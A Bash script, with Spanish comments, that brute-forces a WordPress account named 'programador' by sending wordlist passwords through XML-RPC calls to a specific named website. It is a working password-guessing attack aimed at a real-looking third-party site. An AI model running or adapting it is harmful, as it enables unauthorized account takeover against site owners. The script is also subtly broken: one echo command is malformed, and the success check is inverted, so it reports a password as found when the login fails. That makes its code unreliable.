#!/usr/bin/bash

#Crtl_c para salir
function crtl_c(){
echo -e "\n\n[!] Saliendo... \n"
	exit 1
}

trap crtl_c SIGINT


function createXML(){
password=$1


xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>\{\{programador\}\}</value></param> 
<param><value>\{\{$password\}\}</value></param> 
</params> 
</methodCall>"""


echo$xmlFile > file.xml

response=$(curl -s -X POST "https://setter-digital.com/xmlrpc.php" -d@file.xml)

 if [ "$(echo $response | grep 'Nombre de usuario o contraseña incorrectos.')" ]; then
	echo -e "\n[+] La contraseña para el programador es $password"
	exit 0
 fi


}


cat /usr/share/wordlists/rockyou.txt | while read password; do
	createXML $password

done
